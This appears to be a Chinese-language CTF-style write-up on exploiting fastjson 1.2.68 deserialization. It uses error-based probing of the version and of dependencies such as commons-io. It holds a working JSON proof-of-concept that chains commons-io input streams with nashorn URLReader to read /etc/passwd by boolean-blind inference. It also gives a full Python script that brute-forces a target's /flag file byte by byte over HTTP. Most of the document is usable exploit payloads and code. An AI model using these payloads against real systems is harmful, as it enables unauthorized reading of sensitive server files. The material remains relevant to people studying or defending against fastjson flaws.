这里判断方式与之前方式一致，就不写了。
探测fastjson精确版本：
```json
{
  "@type": "java.lang.AutoCloseable"
```
通过报错，发现版本为1.2.68，在这个大版本下极大的限制 了jndi的利用，因此比较常见的利用方式为文件读写。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693214944518-597de48b-c916-422d-a386-5e4e04dcca7d.png#averageHue=%23fdfdfd&clientId=u2b2ca306-6134-4&from=paste&height=142&id=uc7c3ffaf&originHeight=178&originWidth=1254&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26918&status=done&style=none&taskId=ue16f780d-d980-4e60-b79c-c59beb2ddd1&title=&width=1003.2)
环境依赖探测：
利用charactor类型转换报错，当存在指定的类时会报转换错误，不存在则无显示
先探测是否为JDK11
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693215147683-7e0f9aa8-6c2b-49d3-9bf9-22f1e1cedbde.png#averageHue=%23fcfcfc&clientId=u2b2ca306-6134-4&from=paste&height=156&id=u57f2da7b&originHeight=195&originWidth=1110&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31800&status=done&style=none&taskId=u497bd5af-4261-4c1b-bf3e-943a2a24953&title=&width=888)
很明显不是，那么探测是否存在依赖：commons-io
```json
{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "org.apache.commons.io.Charsets"
}}
```
出现cast转换错误，存在commonss-io，但还无法分辨版本
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693216179131-35484970-7471-48ff-bfc3-a6615d55b080.png#averageHue=%23fefefe&clientId=u2b2ca306-6134-4&from=paste&height=159&id=ub59e0d30&originHeight=199&originWidth=1231&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30846&status=done&style=none&taskId=u29d267f4-1578-4e44-9bf4-bbb72662139&title=&width=984.8)
```json
{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "org.apache.commons.io.file.Counters"
}}
```
`org.apache.commons.io.file.Counters`是在commons-io2.7~2.8引入，无关键报错回显，说明不是2.7~2.8版本
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693216246064-60587330-c7c5-4e9e-9605-6e3f62fe9769.png#averageHue=%23fefefe&clientId=u2b2ca306-6134-4&from=paste&height=155&id=uaec34b6e&originHeight=194&originWidth=1056&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27933&status=done&style=none&taskId=uf9943d1d-dd79-4087-9f2b-c073c23ad0d&title=&width=844.8)
本身在commons-io2.0~2.8下是存在任意文件写入的，但是可能因为系统的原因复现并没有成功(可本地能够成功。。。),所以把思路转变为任意文件读取。
Poc:
```json
{
  "abc": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///etc/passwd"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },
    "boms": [
      {
        "charsetName": "UTF-8",
        "bytes": [
          114,111,111,116
        ]
      }
    ]
  },
  "address": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.CharSequenceReader",
    "charSequence": {
      "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
    "start": 0,
    "end": 0
  }
}
}
```
先测试读/etc/passwd，看看是否成功，因为/etc/passwd文件开头一定为root，对应ascii码的话就是：`114,111,111,116`,这种报错就是成功的，代表字节没问题。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693217559283-cb73454c-d2c3-499c-8f0f-22c1fba72be0.png#averageHue=%23fdfdfd&clientId=u2b2ca306-6134-4&from=paste&height=230&id=u080e1a47&originHeight=288&originWidth=1211&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42687&status=done&style=none&taskId=ue3f1a346-d525-48df-9a56-ce94249107b&title=&width=968.8)
这种说明不对，字节错误
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693217664073-aba513aa-eca8-436c-852b-c4e06d8282ac.png#averageHue=%23fefefe&clientId=uf2a3ebb0-ea3b-4&from=paste&height=246&id=u77f81ea0&originHeight=307&originWidth=1074&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41229&status=done&style=none&taskId=ud65cf226-a196-46dd-896d-7719c4eb213&title=&width=859.2)
因此就导致了bool盲注产生。那么后面就是写脚本读取敏感文件，爆破字节即可。
比如这里读目标flag文件
exp.py: [exp.py](https://www.yuque.com/attachments/yuque/0/2023/py/26045928/1696407182990-4248cf78-7da3-4c33-8817-1e0dd933cb09.py?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2023%2Fpy%2F26045928%2F1696407182990-4248cf78-7da3-4c33-8817-1e0dd933cb09.py%22%2C%22name%22%3A%22exp.py%22%2C%22size%22%3A2035%2C%22ext%22%3A%22py%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u0fe64061-a0fb-4ea3-825d-29caaba9cc6%22%2C%22taskType%22%3A%22transfer%22%2C%22type%22%3A%22text%2Fx-python%22%2C%22mode%22%3A%22title%22%2C%22id%22%3A%22u76742bb2%22%2C%22card%22%3A%22file%22%7D)
```python
import requests
import json

url = "http://10.30.0.84/login"

asciis = [10,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126]
file_byte = []
data1 = """
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///flag"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
"""  

data2 = """
                ]
            }
        ]
    },
    "address": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
            "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
            "start": 0,
            "end": 0
        }
    }
}
"""
proxies = {
    'http': '127.0.0.1:8080',
}

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Content-Type": "application/json; charset=utf-8"
}


for i in range(1,30):  # 需要读取多长自己定义，但一次性不要太长，建议分多次读取
    for i in asciis:
        file_byte.append(str(i))
        req = requests.post(url=url,data=data1+','.join(file_byte)+data2,headers=header)
        text = req.text
        if "charSequence" not in text:
            file_byte.pop()         

print(','.join(file_byte))   
file_str = ""
for i in file_byte:
    file_str += chr(int(i))
print(file_str)
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693217926650-e7de1ddf-e5db-49ed-a785-2ba790e4a3fd.png#averageHue=%231e1c1b&clientId=uf2a3ebb0-ea3b-4&from=paste&height=72&id=u629cd55d&originHeight=90&originWidth=923&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9891&status=done&style=none&taskId=u05ae156b-43cb-4994-92bc-9c6d4a1a912&title=&width=738.4)

